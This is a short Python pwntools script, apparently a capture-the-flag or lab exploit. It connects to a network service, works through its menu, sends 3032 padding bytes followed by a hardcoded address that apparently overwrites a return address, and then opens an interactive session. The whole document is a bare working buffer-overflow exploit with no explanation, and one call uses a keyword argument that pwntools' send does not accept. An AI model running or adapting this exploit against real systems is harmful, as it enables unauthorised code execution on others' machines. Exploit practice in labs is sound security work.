from pwn import *

r = remote('192.168.1.1', 42123)

r.send("1\na\na\n")
r.send("2\na\na\n")
r.send("2\n")
r.send("B"*3032, end="")
r.send("\x6e\x32\x40\x00")

r.interactive()
